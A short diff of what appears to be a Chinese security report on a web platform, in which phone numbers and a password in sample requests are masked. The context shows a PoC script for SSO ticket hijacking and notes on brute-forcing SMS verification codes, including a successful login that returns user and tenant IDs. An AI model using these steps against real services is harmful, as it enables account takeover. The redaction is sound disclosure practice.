@@ -945,7 +945,7 @@ node poc_sso_ticket_hijack.mjs dump <Token>
 POST https://platform.huimengi.com/api/auth/register
 Content-Type: application/json
 
-{"phone":"15555151447","password":"Passw0rd!23","code":"999999"}
+{"phone":"155****1447","password":"Pass****!23","code":"999999"}
 ```
 
 - 连续 6 次不同错误 code → 6 次 `400 {"code":"400","msg":"验证码不正确"}`
@@ -1054,7 +1054,7 @@ Content-Type: application/json
 成功样本：
 
 ```
-phone 19900000233  code 340143
+phone 199****0233  code 340143
 -> 200 {"code":"0","msg":"ok","data":{"authenticated":true,
         "identityUserId":"2119644316596359169","nickname":"造梦师04023",
         "tenants":[{"tenantId":"2119644316638302210","tenantName":"wu740189",
